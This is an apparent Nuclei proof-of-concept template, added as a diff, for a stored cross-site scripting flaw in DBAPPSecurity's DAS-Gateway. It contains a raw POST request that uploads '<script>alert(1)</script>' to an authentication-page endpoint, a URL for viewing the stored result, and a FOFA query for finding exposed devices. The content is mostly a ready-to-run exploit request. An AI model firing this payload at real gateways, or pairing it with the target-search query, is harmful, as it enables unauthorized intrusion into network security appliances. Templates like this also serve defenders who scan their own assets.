@@ -1,0 +1,43 @@
+id: poc-woufhhcsweeg5gx0
+info:
+  name: 安恒安全网关 aaa_local_web_custom_auth_html 存储型xss漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/woufhhcsweeg5gx0'
+  tags: xss,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: woufhhcsweeg5gx0
+    fofa: title="明御安全网关"
+http:
+- raw:
+  - '上传xss文件
+
+    POST /webui/?g=aaa_local_web_custom_auth_html HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36
+
+    Accept-Encoding: gzip, deflate, br
+
+    Accept: */*
+
+    Connection: keep-alive
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Content-Length: 29
+
+
+    con=<script>alert(1)</script>
+
+
+    访问得到结果
+
+    [https://x.x.x.x/auth/preview_2.html](https://x.x.x.x/auth/preview_2.html)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
